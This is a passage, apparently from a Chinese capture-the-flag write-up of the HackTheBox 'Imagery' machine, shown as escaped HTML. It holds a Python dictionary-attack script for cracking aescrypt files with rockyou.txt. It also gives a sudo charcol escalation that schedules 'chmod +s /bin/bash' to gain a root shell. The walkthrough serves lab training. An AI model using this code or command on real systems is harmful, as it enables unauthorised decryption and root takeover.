class=\"hljs-comment\"\u003e# 去除密码前后的空白字符，特别是换行符\u003c/span\u003e\n                password = line.strip()\n                \n                \u003cspan class=\"hljs-comment\"\u003e# 跳过空行\u003c/span\u003e\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e password:\n                    \u003cspan class=\"hljs-keyword\"\u003econtinue\u003c/span\u003e\n\n                \u003cspan class=\"hljs-comment\"\u003e# 打印当前尝试的密码，使用 '\\r' 实现单行刷新效果\u003c/span\u003e\n                \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003ef\"[*] 正在尝试密码: \u003cspan class=\"hljs-subst\"\u003e{password.ljust(\u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e)}\u003c/span\u003e\"\u003c/span\u003e, end=\u003cspan class=\"hljs-string\"\u003e'\\r'\u003c/span\u003e)\n\n                \u003cspan class=\"hljs-comment\"\u003e# 构建 aescrypt 命令\u003c/span\u003e\n                command = [\u003cspan class=\"hljs-string\"\u003e'aescrypt'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'-d'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'-p'\u003c/span\u003e, password, aes_file]\n                \n                \u003cspan class=\"hljs-comment\"\u003e# 执行命令并捕获输出\u003c/span\u003e\n                \u003cspan class=\"hljs-comment\"\u003e# capture_output=True 會捕獲 stdout 和 stderr\u003c/span\u003e\n                \u003cspan class=\"hljs-comment\"\u003e# text=True 会将输出解码为字符串\u003c/span\u003e\n                result = subprocess.run(command, capture_output=\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e, text=\u003cspan class=\"hljs-literal\"\u003eTrue\u003c/span\u003e)\n\n                \u003cspan class=\"hljs-comment\"\u003e# 检查标准错误输出\u003c/span\u003e\n                \u003cspan class=\"hljs-comment\"\u003e# aescrypt 在密码错误时会将错误信息输出到 stderr\u003c/span\u003e\n                error_message = \u003cspan class=\"hljs-string\"\u003e\"Message has been altered or password is incorrect\"\u003c/span\u003e\n                \n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e error_message \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e result.stderr:\n                    \u003cspan class=\"hljs-comment\"\u003e# 如果错误信息不在输出中，说明密码可能正确\u003c/span\u003e\n                    \u003cspan class=\"hljs-comment\"\u003e# 清除'正在尝试'那一行\u003c/span\u003e\n                    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\" \"\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e60\u003c/span\u003e, end=\u003cspan class=\"hljs-string\"\u003e'\\r'\u003c/span\u003e) \n                    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003ef\"\\n[+] 成功! 找到密码: \u003cspan class=\"hljs-subst\"\u003e{password}\u003c/span\u003e\"\u003c/span\u003e)\n                    decrypted_file = aes_file.rsplit(\u003cspan class=\"hljs-string\"\u003e'.aes'\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]\n                    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003ef\"[*] 文件已解密为: \u003cspan class=\"hljs-subst\"\u003e{decrypted_file}\u003c/span\u003e\"\u003c/span\u003e)\n                    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e# 找到密码后，退出函数\u003c/span\u003e\n\n    \u003cspan class=\"hljs-keyword\"\u003eexcept\u003c/span\u003e FileNotFoundError:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003ef\"[!] 错误: 字典文件 '\u003cspan class=\"hljs-subst\"\u003e{dictionary_file}\u003c/span\u003e' 未找到。\"\u003c/span\u003e, file=sys.stderr)\n        sys.exit(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n    \u003cspan class=\"hljs-keyword\"\u003eexcept\u003c/span\u003e Exception \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e e:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003ef\"\\n[!] 发生未知错误: \u003cspan class=\"hljs-subst\"\u003e{e}\u003c/span\u003e\"\u003c/span\u003e, file=sys.stderr)\n        sys.exit(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n\n    \u003cspan class=\"hljs-comment\"\u003e# 如果循环结束仍未找到密码\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\\n[-] 破解失败: 字典中未找到正确的密码。\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e\"__main__\"\u003c/span\u003e:\n    \u003cspan class=\"hljs-comment\"\u003e# 设置命令行参数解析器\u003c/span\u003e\n    parser = argparse.ArgumentParser(\n        description=\u003cspan class=\"hljs-string\"\u003e\"使用字典攻击破解 aescrypt 加密的 AES 文件。\"\u003c/span\u003e,\n        formatter_class=argparse.RawTextHelpFormatter \u003cspan class=\"hljs-comment\"\u003e# 保持帮助信息格式\u003c/span\u003e\n    )\n    parser.add_argument(\u003cspan class=\"hljs-string\"\u003e\"aes_file\"\u003c/span\u003e, \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"要解密的 .aes 文件路径。\"\u003c/span\u003e)\n    parser.add_argument(\u003cspan class=\"hljs-string\"\u003e\"dictionary_file\"\u003c/span\u003e, \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"包含密码列表的字典文件路径。\"\u003c/span\u003e)\n\n    args = parser.parse_args()\n\n    \u003cspan class=\"hljs-comment\"\u003e# 运行前检查依赖\u003c/span\u003e\n    check_dependencies()\n    \n    \u003cspan class=\"hljs-comment\"\u003e# 开始破解\u003c/span\u003e\n    crack_aes_file(args.aes_file, args.dictionary_file)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e指定字典 \u003ccode\u003erockyou.txt\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e解压出来后是 \u003ccode\u003eweb\u003c/code\u003e 端源代码，但是 \u003ccode\u003edb.json\u003c/code\u003e 有 mark 的凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e     env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/snap/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e,\n    use_pty\n\nUser mark may run the following commands on Imagery:\n    (ALL) NOPASSWD: /usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/charcol\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看帮助\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image23.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eauto add --schedule \u003cspan class=\"hljs-string\"\u003e\"* * * * *\"\u003c/span\u003e --command \u003cspan class=\"hljs-string\"\u003e\"chmod +s /bin/bash\"\u003c/span\u003e --name \u003cspan class=\"hljs-string\"\u003e\"sunset\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e等待执行即可\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image24.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看 \u003ccode\u003e/bin/bash\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebash-\u003cspan class=\"hljs-number\"\u003e5.2\u003c/span\u003e$ ls -al /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash\n-rwsr-sr-x \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e1474768\u003c/span\u003e Oct \u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取 root.txt\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebash-\u003cspan cl
